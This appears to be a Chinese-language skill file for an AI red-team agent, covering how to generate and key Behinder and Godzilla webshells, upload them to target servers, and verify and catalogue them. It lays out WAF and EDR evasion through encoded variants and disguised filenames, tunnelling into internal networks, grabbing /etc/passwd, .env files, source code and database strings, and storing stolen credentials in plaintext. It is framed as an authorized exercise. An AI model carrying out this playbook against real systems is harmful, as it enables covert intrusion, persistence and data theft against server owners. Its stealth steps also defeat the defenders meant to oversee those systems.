---
name: webshell-toolkit
description: 冰蝎 / 哥斯拉 / 中国蚁剑 的启动与用法，用于上传并管理 WebShell、维持访问、操作目标服务器
whenToUse: 已获得上传点/文件写入/命令执行，需要落地并操作 WebShell 时
role: exploit
enabled: true
---

# WebShell 工具包（已就位）

目录 `$DSH_HOME/redteam/toolkit/`，Java 25 已安装。

## 铁律：落地必须是冰蝎马 / 哥斯拉马（加密马）

**用户要在控制台用冰蝎/哥斯拉客户端直连使用这个入口**，所以：
- **默认只落地冰蝎马（Behinder）或哥斯拉马（Godzilla）的加密马**，并把 `shell_type` + `pass_key` 落库（`redteam_webshell_add`）。
- **一句话马（`?cmd=`）/ 自研马 / 内存马不算交付**：用户连不上、无法交互操作。只能作为**临时中转**（例如只为投递真正的马或建隧道），且必须在 note 里写明"临时中转，非交付入口"。
- 哥斯拉 GUI 生成需要人在场；**优先用下面「无 GUI 生成冰蝎马」的方式**，一条命令就能产出可交付的马。

## 无 GUI 生成冰蝎马（推荐，可脚本化）

冰蝎马只是把密钥写进模板：密钥 = `md5(连接密码)[:16]`。仓库自带模板：
`$DSH_HOME/redteam/toolkit/Behinder/server/{shell.jsp,shell.jspx,shell_java9.jsp,shell.php,shell.aspx,shell.ashx,shell.asp}`

```bash
TK=$DSH_HOME/redteam/toolkit
PASS='Rt@2026#xz'                       # 连接密码（随机生成，别用 rebeyond）
KEY=$(printf '%s' "$PASS" | md5sum | cut -c1-16)   # 冰蝎要求 32 位 md5 的前 16 位
# JSP：替换模板里的密钥
sed "s/e45e329feb5d925b/$KEY/" $TK/Behinder/server/shell.jsp > /tmp/rt-shell.jsp
# PHP：同理（模板变量名 $key）
sed "s/e45e329feb5d925b/$KEY/" $TK/Behinder/server/shell.php > /tmp/rt-shell.php
echo "连接密码 $PASS ｜ 密钥 $KEY"      # 两者都要写进 runs/ 与 redteam_webshell_add
```

- 默认密钥 `e45e329feb5d925b` = `md5("rebeyond")[:16]`（模板里的注释就是这个意思）——**必须换成自己的密码**，用默认密码等于把马送给防守方。
- 目标有 WAF/查杀时用 unicode 转义变体 `shell_uni.jsp`：密钥也是转义形式，需按 `\\u00xx` 逐字符替换（可用 python 生成）。
- 已实测：`shell.jsp / shell.jspx / shell_java9.jsp / shell.php / shell.aspx / shell.ashx / shell.asp` 七个模板都能用上面这条 `sed` 一条命令换好密钥。

哥斯拉马（需要 GUI 时）：
```bash
DISPLAY=:10.0 java -jar $DSH_HOME/redteam/toolkit/Godzilla/godzilla.jar
# 管理 → 生成：载荷 java/jsp、加密器 Java_AES_BASE64、密码与密钥随机 → 生成后上传
```

## 上传后必须验证"用户能连上"
1. `curl -s -o /dev/null -w '%{http_code}' "https://target/upload/x.jsp"` → 预期 200（**不要用 GET 带 cmd 参数去测**，冰蝎/哥斯拉马不响应明文命令）。
2. 用冰蝎或哥斯拉 GUI 新建连接（URL + 连接密码）点「测试连接」→ 通了才算成功；通了再用虚拟终端执行 `id/whoami`。
3. 落库必须写全：`url`、`shell_type=behinder|godzilla`、`pass_key=连接密码`、`privilege`、`secret_ref`（证据文件）；随后**立刻建 suo5 隧道**（技能 `suo5-tunnel`）。

## 工具一览

| 工具 | 启动命令 | 说明 |
|---|---|---|
| 冰蝎 Behinder v4.1 | `java -jar $DSH_HOME/redteam/toolkit/Behinder/Behinder.jar` | AES 加密流量，JSP/PHP/ASPX |
| 哥斯拉 Godzilla v4.0.1 | `java -jar $DSH_HOME/redteam/toolkit/Godzilla/godzilla.jar` | 支持 JSP/PHP/ASPX 全加密 payload |
| 中国蚁剑 AntSword | `$DSH_HOME/redteam/toolkit/AntSword/AntSword-Loader-v4.0.3-linux-x64/AntSword` | 首次启动选择源码目录 `antSword-2.1.16` |
| suo5 隧道 | `./suo5-linux-amd64` | 见技能 `suo5-tunnel` |

## 典型流程（授权演练）
1. **确定写入点**：上传漏洞 / 任意文件写 / 后台插件上传 / 模板写入 / 数据库写文件（`INTO OUTFILE`）。
2. **生成 payload**：按目标语言选 JSP/JSPX/PHP/ASPX（见上「无 GUI 生成冰蝎马」），密码随机生成并记到 `runs/`。
3. **上传并访问**：`curl -s "https://target.example.com/upload/x.jsp"` 确认返回 200；不要把 shell 放在显眼路径（如 `/shell.jsp`），用与静态资源同风格的随机文件名。
4. **连接管理**：在工具里新增 URL + 密码，测试连接；成功后用「虚拟终端」执行命令。
5. **维持与利用**：
   - 收集 `id/whoami/hostname/uname -a`、系统账号、内网 IP、路由。
   - **立刻用 suo5 起隧道进内网**（技能 `suo5-tunnel`，这是内网突破的标准通道）。
   - 抓取敏感文件：`/etc/passwd`、配置、`.env`、源码、数据库连接串 → 存 `runs/`。
6. **落库**：
   - `redteam_webshell_add`（url / **shell_type** / **pass_key** / privilege / secret_ref）
   - `redteam_access_add`（host/账号/方式 webshell/权限/会话引用）
   - `redteam_vuln_update` 把入口漏洞置为 `exploited`
   - `redteam_http_evidence_add` 保存上传请求与 shell 访问请求
   - `redteam_chain_add`（stage=exploit/access）

## 命令执行（临时中转时才用）
如果只需要一次性命令执行，优先直接用已有 RCE 或隧道，不必落一句话马：
```bash
# 例：通过临时一句话马传参执行（用后即删，不算交付入口）
curl -s "https://target.example.com/upload/x.jsp?cmd=id"
# 冰蝎/哥斯拉是 GUI 工具，命令行下用 suo5 隧道 + 常规工具更省事
```

## 注意事项
- 生成的 shell 只能上传到**本次授权演练的目标**；用完按需清理（删除文件、恢复原状）。
- 工具 GUI 需要图形会话（`DISPLAY=:10.0` 可用）。
- 凭据用 `redteam_credential_add` 落库：**明文写 `secret_value`**（面板直接显示，便于复用），同时把证据文件写 `runs/` 并在 `secret_ref` 里引用。资产库只在本机，别把库或导出内容带走。
- 目标可能有 EDR/查杀：先测试 shell 是否存活，避免反复落地触发告警；落地失败就换语言/编码（JSP→JSPX→PHP）或换上传点。
